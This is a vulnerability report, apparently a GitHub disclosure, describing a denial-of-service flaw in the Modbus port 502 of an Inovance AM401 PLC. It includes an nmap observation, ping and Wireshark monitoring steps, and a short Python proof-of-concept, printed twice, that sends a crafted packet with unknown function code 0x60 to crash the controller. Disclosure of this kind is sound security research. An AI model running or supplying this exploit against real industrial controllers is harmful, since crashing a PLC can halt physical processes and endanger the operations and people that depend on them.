# Summary
There is a denial of service vulnerability in port 502 of Inovance AM401 PLC. An attacker can send a carefully constructed message to cause the PLC device to crash.

Crash occurs when handling **unkown function code 0x60**.

# Details

Details of PLC:
![image](https://github.com/user-attachments/assets/f6878a4b-22ef-4c3a-85c4-06202652306b)



Nmap scans device ports:![image](https://github.com/user-attachments/assets/681555a3-9251-47b4-af51-9575f3166249)

You can see that port 502 is open.

Use
```
ping 192.168.1.88 -t
```
to monitor and use wireshark to capture the pakcet.

Use
```
python3 poc.py
```
to run this PoC script:
```py
import socket
import time

datas = ["00010000000bfe60e9e9e8e91711fa16e9"]

for i in range(1):
    for data in datas:
        packet = bytes.fromhex(data)
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("192.168.1.88",502))
        s.send(packet)
        s.close()
```

You will see that the PLC is crashed.
![image](https://github.com/user-attachments/assets/e9284b13-73a0-4f94-b0f6-474ba3c96005)

![image](https://github.com/user-attachments/assets/a403f77c-07ae-45dd-b5f9-3339e8ab0cd9)

And I upload the whole capture of wireshark here: https://github.com/N0zoM1z0/Vuln-Search/blob/main/AM401_0x60_DoS.pcapng .

# PoC
My host ip is `192.168.1.149` and the device's ip is `192.168.1.88`.

```py
import socket
import time

datas = ["00010000000bfe60e9e9e8e91711fa16e9"]

for i in range(1):
    for data in datas:
        packet = bytes.fromhex(data)
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("192.168.1.88",502))
        s.send(packet)
        s.close()

```

# Discoverer
ylqncepu@163.com

https://github.com/N0zoM1z0

